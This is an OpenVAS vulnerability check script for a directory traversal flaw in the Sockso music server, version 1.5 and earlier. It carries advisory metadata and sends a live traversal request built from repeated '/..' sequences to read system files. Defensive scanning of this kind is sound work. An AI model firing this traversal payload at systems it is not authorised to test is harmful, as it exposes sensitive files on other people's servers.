###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sockso_dir_trav_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Sockso Directory Traversal Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to obtain sensitive information
  that could aid in further attacks.
  Impact Level: Application";
tag_affected = "Sockso version 1.5 and prior";
tag_insight = "The flaw is due to improper validation of URI containing '../' or
  '..\' sequences, which allows attackers to read arbitrary files via directory
  traversal attacks.";
tag_solution = "Upgrade to Sockso version 1.5.1 or later.
  For updates refer to http://sockso.pu-gh.com/";
tag_summary = "The host is running Sockso and is prone to directory traversal
  vulnerability.";

if(description)
{
  script_id(802817);
  script_version("$Revision: 12 $");
  script_bugtraq_id(52509);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-03-16 13:28:19 +0530 (Fri, 16 Mar 2012)");
  script_name("Sockso Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18605/");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/52509/info");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/110828/sockso_1-adv.txt");

  script_description(desc);
  script_summary("Check if Sockso is vulnerable to directory traversal");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_require_ports("Services/www", 4444);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
port = 0;
file = "";
files = "";
banner = "";

## Get Sockso Port
port = get_http_port(default:4444);
if(!port){
  port = 4444;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if(!banner || "Server: Sockso" >!< banner){
  exit(0);
}

## Construct attack request
files = traversal_files();

foreach file (keys(files))
{
  ## Construct Directory Traversal Attack
  url = string(crap(data:"/..", length:49), files[file]);

  ## Try exploit and check the response to confirm vulnerability
  if(http_vuln_check(port:port, url:"/file" + url, pattern:file))
  {
    security_warning(port);
    exit(0);
  }
}
